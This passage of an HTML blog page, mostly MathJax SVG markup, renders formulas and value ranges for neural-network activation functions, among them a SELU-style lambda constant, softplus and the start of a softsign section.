334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(13278, 0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(13778, 0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(14278, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(14778, 0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(15278, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(15778, 0)"></path></g></g></g></svg></mjx-container></p>
<p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="41.164ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 18194.6 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mo" transform="translate(860.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1916.6, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(778, 0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1778, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(2278, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2778, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3278, 0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(3778, 0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(4278, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(4778, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(5278, 0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(5778, 0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(6278, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(6778, 0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(7278, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7778, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(8278, 0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(8778, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(9278, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(9778, 0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(10278, 0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(10778, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(11278, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(11778, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(12278, 0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(12778, 0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(13278, 0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(13778, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(14278, 0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(14778, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(15278, 0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(15778, 0)"></path></g></g></g></svg></mjx-container></p>
<h1 id="softplus"><a href="#softplus" class="headerlink" title="softplus"></a>softplus</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.255ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4974.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389, 0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(1333.7, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mtext" fill="red" stroke="red" transform="translate(2111.7, 0)"><path data-c="5C" d="M56 731Q56 740 62 745T75 750Q85 750 92 740Q96 733 270 255T444 -231Q444 -239 438 -244T424 -250Q414 -250 407 -240Q404 -236 230 242T56 731Z"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(500, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(778, 0)"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(1334, 0)"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(1640, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1918, 0)"></path></g><g data-mml-node="mo" transform="translate(4585.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">f(x)=ln(1+e^x)</script><h1 id="softsign"><a href="#softsign" class="headerlink" title="softsign"></a>softsign</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.789ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3000.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(389, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1167, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1667, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(2111.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2611.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 